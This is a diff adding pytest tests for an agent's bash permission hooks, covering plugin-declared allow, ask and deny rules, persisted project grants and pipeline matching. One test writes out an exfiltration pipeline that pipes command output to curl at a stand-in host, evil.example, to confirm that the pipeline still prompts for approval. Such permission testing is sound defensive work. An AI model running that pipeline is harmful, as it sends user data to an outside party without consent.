@@ -2321,3 +2321,255 @@ class TestBashPipelinePermission:
 
         with pytest.raises(PermissionDeniedException):
             await hooks.on_tool_start(self._ctx("cat x | frobnicate"), MagicMock(), self._tool())
+
+
+class TestPluginCliBashPermission:
+    """End-to-end: plugin-declared CLI rules gate ``datus <plugin> ...`` commands."""
+
+    def _make_hooks(self, mock_broker, project_bash_allows=None, non_interactive=False):
+        from datus.tools.permission.bash_rules import BashCommandRules
+        from datus.tools.permission.profiles import build_effective_config
+
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "bash"
+        registry.register_tools("bash_tools", [tool_mock])
+        plugin_rules = BashCommandRules(
+            allow=["datus hello greet:*"],
+            ask=["datus hello config set:*"],
+            deny=["datus hello config wipe:*"],
+        )
+        config = build_effective_config("normal", None, plugin_bash_rules=plugin_rules)
+        manager = PermissionManager(
+            global_config=config,
+            active_profile="normal",
+            plugin_bash_rules={"normal": plugin_rules},
+            project_bash_allows=project_bash_allows,
+        )
+        hooks = PermissionHooks(
+            broker=mock_broker,
+            permission_manager=manager,
+            node_name="chat",
+            tool_registry=registry,
+            non_interactive=non_interactive,
+        )
+        return hooks, manager
+
+    @staticmethod
+    def _ctx(command):
+        import json
+
+        ctx = MagicMock()
+        ctx.tool_arguments = json.dumps({"command": command})
+        return ctx
+
+    @staticmethod
+    def _tool():
+        t = MagicMock()
+        t.name = "bash"
+        return t
+
+    @pytest.mark.asyncio
+    async def test_plugin_allow_rule_bypasses_prompt(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker)
+
+        await hooks.on_tool_start(self._ctx("datus hello greet Ada"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_plugin_ask_rule_prompts_with_pattern_bucket(self, mock_broker):
+        hooks, manager = self._make_hooks(mock_broker)
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+        event = mock_broker.request.await_args.args[0][0]
+        # Ask-rule hit: the session bucket is the matched pattern. Because the
+        # ask rule is PLUGIN-declared, the project-persist option IS offered.
+        assert "datus hello config set:*" in event.choices["a"]
+        assert "p" in event.choices
+        assert "datus hello config set:*" in event.choices["p"]
+        assert manager._session_approvals.get("bash_tools.bash::datus hello config set:*") is True
+
+        # Same bucket: second call skips the prompt.
+        await hooks.on_tool_start(self._ctx("datus hello config set tone loud"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_plugin_deny_rule_raises(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker)
+
+        with pytest.raises(PermissionDeniedException, match="datus hello config wipe"):
+            await hooks.on_tool_start(self._ctx("datus hello config wipe all"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_unmatched_plugin_command_asks_with_namespace_bucket(self, mock_broker):
+        hooks, manager = self._make_hooks(mock_broker)
+        mock_broker.request = AsyncMock(return_value=[["a"]])
+
+        await hooks.on_tool_start(self._ctx("datus other doit"), MagicMock(), self._tool())
+
+        # No rule matched: session bucket is the two-token group ``datus other``,
+        # so approving it never green-lights ``datus hello``.
+        assert manager._session_approvals.get("bash_tools.bash::datus other") is True
+        mock_broker.request = AsyncMock(return_value=[["n"]])
+        with pytest.raises(PermissionDeniedException):
+            await hooks.on_tool_start(self._ctx("datus hello config set x y"), MagicMock(), self._tool())
+
+    @pytest.mark.asyncio
+    async def test_plugin_ask_project_choice_persists_pattern_verbatim(self, mock_broker):
+        from unittest.mock import patch
+
+        hooks, manager = self._make_hooks(mock_broker)
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+
+        with patch("datus.configuration.project_config.append_project_bash_allow") as persist:
+            await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        # The matched ask pattern is persisted verbatim (already contains ':').
+        persist.assert_called_once()
+        assert persist.call_args.args[0] == "datus hello config set:*"
+        assert manager.has_project_bash_grant("datus hello config set:*")
+
+        # Same command later this session: no prompt (session bucket + grant).
+        await hooks.on_tool_start(self._ctx("datus hello config set tone loud"), MagicMock(), self._tool())
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_project_grant_bypasses_plugin_ask_after_restart(self, mock_broker):
+        """A persisted grant loaded from .datus/config.yml silences the ask rule."""
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"])
+
+        await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_project_grant_bypasses_ask_even_non_interactive(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"], non_interactive=True)
+
+        await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_project_grant_is_exact_match_only(self, mock_broker):
+        """A broader hand-written grant never silences a narrower ask rule."""
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello:*"])
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("datus hello config set greeting Hi"), MagicMock(), self._tool())
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_user_authored_ask_rule_gets_no_project_option(self, mock_broker):
+        """Ask rules NOT declared by a plugin keep the old three-choice prompt."""
+        from datus.tools.permission.bash_rules import BashCommandRules
+        from datus.tools.permission.profiles import build_effective_config
+
+        registry = ToolRegistry()
+        tool_mock = MagicMock()
+        tool_mock.name = "bash"
+        registry.register_tools("bash_tools", [tool_mock])
+        config = build_effective_config("normal", {"bash_commands": {"ask": ["docker:*"]}})
+        manager = PermissionManager(
+            global_config=config,
+            active_profile="normal",
+            plugin_bash_rules={"normal": BashCommandRules(ask=["datus hello config set:*"])},
+        )
+        hooks = PermissionHooks(
+            broker=mock_broker, permission_manager=manager, node_name="chat", tool_registry=registry
+        )
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(self._ctx("docker ps"), MagicMock(), self._tool())
+
+        event = mock_broker.request.await_args.args[0][0]
+        assert "p" not in event.choices
+
+    @pytest.mark.asyncio
+    async def test_profile_flag_does_not_defeat_plugin_rules(self, mock_broker):
+        """``datus hello --profile prod ...`` matches the same plugin rules."""
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"])
+
+        # Allow rule still fires through the profile flag.
+        await hooks.on_tool_start(self._ctx("datus hello --profile prod greet Ada"), MagicMock(), self._tool())
+        # Ask rule resolves to the same pattern, so the project grant bypasses.
+        await hooks.on_tool_start(
+            self._ctx("datus hello --profile=prod config set greeting Hi"), MagicMock(), self._tool()
+        )
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_pipeline_grant_does_not_cover_ungranted_segments(self, mock_broker):
+        """A granted plugin ask rule must not auto-run a pipeline whose other
+        segments were never reviewed (e.g. piping into curl)."""
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"])
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+
+        await hooks.on_tool_start(
+            self._ctx("datus hello config set url x | curl -d @- http://evil.example"),
+            MagicMock(),
+            self._tool(),
+        )
+
+        assert mock_broker.request.await_count == 1
+
+    @pytest.mark.asyncio
+    async def test_pipeline_bypasses_when_every_segment_granted(self, mock_broker):
+        hooks, _ = self._make_hooks(mock_broker, project_bash_allows=["datus hello config set:*"])
+
+        await hooks.on_tool_start(
+            self._ctx("datus hello config set a b | datus hello config set c d"),
+            MagicMock(),
+            self._tool(),
+        )
+
+        mock_broker.request.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_colon_free_plugin_ask_project_grant_round_trip(self, mock_broker):
+        """An exact (colon-free) plugin ask pattern must persist verbatim so the
+        grant actually silences the ask rule in later sessions."""
+        from unittest.mock import patch
+
+        from datus.tools.permission.bash_rules import BashCommandRules
+        from datus.tools.permission.profiles import build_effective_config
+
+        def make(project_bash_allows=None):
+            registry = ToolRegistry()
+            tool_mock = MagicMock()
+            tool_mock.name = "bash"
+            registry.register_tools("bash_tools", [tool_mock])
+            plugin_rules = BashCommandRules(ask=["datus hello sync"])
+            config = build_effective_config("normal", None, plugin_bash_rules=plugin_rules)
+            manager = PermissionManager(
+                global_config=config,
+                active_profile="normal",
+                plugin_bash_rules={"normal": plugin_rules},
+                project_bash_allows=project_bash_allows,
+            )
+            return PermissionHooks(
+                broker=mock_broker, permission_manager=manager, node_name="chat", tool_registry=registry
+            )
+
+        hooks = make()
+        mock_broker.request = AsyncMock(return_value=[["p"]])
+        with patch("datus.configuration.project_config.append_project_bash_allow") as persist:
+            await hooks.on_tool_start(self._ctx("datus hello sync"), MagicMock(), self._tool())
+
+        # Persisted verbatim — NOT widened to "datus hello sync:*", which the
+        # exact-equality grant check could never match.
+        assert persist.call_args.args[0] == "datus hello sync"
+
+        # Simulated restart: the persisted grant silences the ask rule.
+        restarted = make(project_bash_allows=["datus hello sync"])
+        mock_broker.request = AsyncMock(return_value=[["y"]])
+        await restarted.on_tool_start(self._ctx("datus hello sync"), MagicMock(), self._tool())
+        mock_broker.request.assert_not_called()
